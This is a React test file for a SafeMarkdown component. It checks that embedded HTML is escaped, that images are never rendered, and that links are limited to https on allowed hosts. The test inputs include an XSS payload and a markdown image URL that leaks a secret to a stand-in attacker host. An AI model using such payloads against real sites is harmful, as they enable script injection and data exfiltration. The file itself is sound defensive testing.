import { cleanup, render } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";

import { SafeMarkdown } from "./SafeMarkdown";

afterEach(cleanup);

describe("SafeMarkdown (SG-13)", () => {
  it("renders HTML as text, never as markup", () => {
    const { container } = render(<SafeMarkdown content={'<img src=x onerror="alert(1)"><script>alert(2)</script>'} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
    expect(container.textContent).toContain("<script>");
  });

  it("never renders images, even from markdown image syntax", () => {
    const { container } = render(<SafeMarkdown content="![x](https://evil.example/leak?d=secret)" />);
    expect(container.querySelector("img")).toBeNull();
  });

  it("links only https URLs on allowed hosts", () => {
    const { container } = render(
      <SafeMarkdown
        content={"See https://medlineplus.gov/a1c.html and https://evil.example/x and http://medlineplus.gov/b"}
        allowedHosts={["medlineplus.gov"]}
      />,
    );
    const links = [...container.querySelectorAll("a")].map((a) => a.getAttribute("href"));
    expect(links).toEqual(["https://medlineplus.gov/a1c.html"]);
    expect(container.textContent).toContain("https://evil.example/x");
  });

  it("opens allowed links safely", () => {
    const { container } = render(<SafeMarkdown content="https://medlineplus.gov/x" allowedHosts={["medlineplus.gov"]} />);
    expect(container.querySelector("a")?.getAttribute("rel")).toBe("noopener noreferrer");
  });

  it("keeps the supported formatting", () => {
    const { container } = render(<SafeMarkdown content={"Please **rest** today.\n\n- one\n- two"} />);
    expect(container.querySelector("strong")?.textContent).toBe("rest");
    expect(container.querySelectorAll("li")).toHaveLength(2);
  });
});
